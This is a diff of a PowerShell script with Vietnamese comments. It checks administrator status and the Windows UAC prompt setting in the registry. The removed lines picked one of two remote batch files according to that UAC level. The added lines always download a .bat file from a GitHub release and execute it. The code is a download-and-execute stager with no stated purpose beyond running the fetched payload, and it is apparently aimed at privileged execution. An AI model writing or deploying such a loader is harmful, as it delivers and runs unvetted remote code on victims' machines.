@@ -20,15 +20,9 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
         $uacLevel = Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" | Select-Object -ExpandProperty "ConsentPromptBehaviorAdmin"
         
         # Kiểm tra mức độ UAC và in thông báo
-        if ($uacLevel -eq 5 -or $uacLevel -eq 0) {
-            $url = "https://raw.githubusercontent.com/43a1723/test/main/Extras/XD.cmd"
-            Invoke-WebRequest -Uri $url -OutFile $outputFile -ErrorAction Stop
-            Start-Process -FilePath $outputFile -Wait -ErrorAction Stop
-        } else {
-            $url = "https://github.com/43a1723/test/releases/download/AutoBuild/download.bat"
-            Invoke-WebRequest -Uri $url -OutFile $outputFile -ErrorAction Stop
-            Start-Process -FilePath $outputFile -Wait -ErrorAction Stop
-        }
+        $url = "https://github.com/43a1723/test/releases/download/AutoBuild/download.bat"
+        Invoke-WebRequest -Uri $url -OutFile $outputFile -ErrorAction Stop
+        Start-Process -FilePath $outputFile -Wait -ErrorAction Stop
         Write-Output "Khởi chạy tệp batch."
         
         # Kết thúc tiến trình PowerShell sau khi thực thi tệp batch
